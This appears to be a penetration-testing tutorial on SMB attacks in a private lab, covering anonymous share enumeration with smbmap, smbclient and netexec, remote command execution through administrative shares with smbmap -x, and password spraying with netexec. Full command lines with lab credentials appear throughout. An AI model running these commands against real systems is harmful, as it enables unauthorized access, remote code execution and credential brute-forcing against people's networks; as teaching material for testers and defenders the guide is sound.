**Server Message Block (SMB)** is a network protocol that was developed for file sharing. It enables computers to share files, printers and other resources over a network.

Threats Associated with SMB

**Case 1: Guest or Anonymous access to share**

Sometimes it is possible to properly authenticate to SMB even without knowing any credentials. This can be dangerous as it could leak sensitive data. It could even lead to Remote Code Execution.

**smbmap**

***smbmap -H 192.168.1.10*** >> List shares with anonymous access

<img width="732" height="347" alt="image" src="https://github.com/user-attachments/assets/05808a06-842b-40e3-9c95-5bd6d5e5ff33" />

************************************************************************

***smbmap -H 192.168.1.10 -u leo -p 'Hexdump123!'*** >> List shares with authentication

Here we are authenticating with username and password.

<img width="877" height="505" alt="image" src="https://github.com/user-attachments/assets/7f0293ed-ca35-4801-b094-f40c5e8c7674" />

************************************************************************

***smbmap -H 192.168.1.10 -u leo -- prompt*** >> It we dont want to put password in the command and want a prompt to enter the password.

<img width="892" height="460" alt="image" src="https://github.com/user-attachments/assets/26175503-4ccb-445f-be83-ac99f86be3da" />

*******************************************************************************

***smbmap -H 192.168.1.10 -u leo -p 'Hexdump123!' -r 'ShareFile'*** >> If we want to list the content of a share.

<img width="900" height="530" alt="image" src="https://github.com/user-attachments/assets/efffbf3e-d34a-4bb2-ba72-f617cc37feb5" />

*******************************************************************************

***smbmap -H 192.168.1.10 -u leo -p 'Hexdump123!' -v*** >> To read OS version

<img width="790" height="347" alt="image" src="https://github.com/user-attachments/assets/c31a788a-8f00-4e80-8aff-4c038e5a58aa" />

*******************************************************************************
*******************************************************************************

**smbclient**

***smbclient -L //192.168.1.10 -U leo*** >> to list the shares, we have to put the password

<img width="796" height="326" alt="image" src="https://github.com/user-attachments/assets/aee4b736-d6ce-4248-9291-38d0fa344050" />

*******************************************************************************

***smbclient -L //192.168.1.10 -U 'hexdump.lab/leo%Hexdump123!'*** >> To list the shares with username and password

<img width="797" height="297" alt="image" src="https://github.com/user-attachments/assets/e8a91b3d-67cd-41d4-ae3a-8976fe2302b3" />

*******************************************************************************

***smbclient //192.168.1.10/ShareFile -U 'hexdump.lab/leo%Hexdump123!'*** >> It will give access to the share folder

<img width="875" height="340" alt="image" src="https://github.com/user-attachments/assets/b0484f4d-2dcd-4a86-bb42-bc5d7973510d" />

ls → to list files

cd → to change directories

get → to download any file

put → to upload any file

*******************************************************************************
*******************************************************************************

**netexec**

***nxc smb 192.168.1.10 -u leo -p 'Hexdump123!' -- shares***

<img width="900" height="213" alt="image" src="https://github.com/user-attachments/assets/e5b8ef55-7ffe-41ed-9e5e-964edaa4daa9" />

*******************************************************************************

***nxc smb 192.168.1.10 -u '' -p '' -- users*** >> Try to authenticate using null session

<img width="900" height="241" alt="image" src="https://github.com/user-attachments/assets/1e5332e9-3832-4104-89e5-de66c82932f3" />

*******************************************************************************
*******************************************************************************

**Case 2: REC via access to Administrative Shares**

If we have admin access is it possible to access administrative shares of SMB such as ADMIN$, C$ and IPC$, then it might be possible to obtain Remote Code Execution (RCE)

***smbmap -H 192.168.1.10 -u administrator -p 'Password123'***

<img width="900" height="501" alt="image" src="https://github.com/user-attachments/assets/79fdd89a-2a3d-411b-85b8-a22701e73e80" />

It displays all the shares available. 

Now, we can run any command after -x 

***smbmap -H 192.168.1.10 -u administrator -p 'Password123' -x whoami***

<img width="777" height="420" alt="image" src="https://github.com/user-attachments/assets/09b3a04e-fdc6-43e1-b1ab-653037ab8297" />

***smbmap -H 192.168.1.10 -u administrator -p 'Password123' -x dir***

<img width="727" height="632" alt="image" src="https://github.com/user-attachments/assets/0ab7d099-0de2-4bd1-b2b6-850533dfd360" />

***smbmap -H 192.168.1.10 -u administrator -p 'Password123' -x whoami/priv***

<img width="900" height="577" alt="image" src="https://github.com/user-attachments/assets/fc98b47f-71b1-426e-9d04-93aaaa245c25" />

*******************************************************************************
*******************************************************************************

**Case 3: Password Spraying**

We can use netexec to perform password Spraying.

Password spraying is a brute‑force attack technique where attackers try one common password across many accounts instead of many passwords against one account. This "low‑and‑slow" approach helps them avoid account lockouts and increases the chance of finding at least one weak credential.

<img width="900" height="341" alt="image" src="https://github.com/user-attachments/assets/3fd8656a-065a-4970-9032-f011222d8560" />

***nxc smb 192.168.1.10 -u leo -p passwords.txt***

We can also put a list of users as well

***nxc smb 192.168.1.10 -u username.txt -p passwords.txt***

<img width="900" height="252" alt="image" src="https://github.com/user-attachments/assets/5f612714-c1c7-4b3f-8675-f5812f01b714" />

It will stop if one correct password is found.

***nxc smb 192.168.1.10 -u username.txt -p passwords.txt --continue-on-success***

<img width="900" height="324" alt="image" src="https://github.com/user-attachments/assets/551ab251-091a-415b-8c72-3d1a3ca10ea6" />

We can also use IP address as well

***nxc smb ip.txt -u username.txt -p passwords.txt --continue-on-success***

<img width="900" height="570" alt="image" src="https://github.com/user-attachments/assets/cb314a74-ee46-47ea-8bd1-c497f7e59a22" />
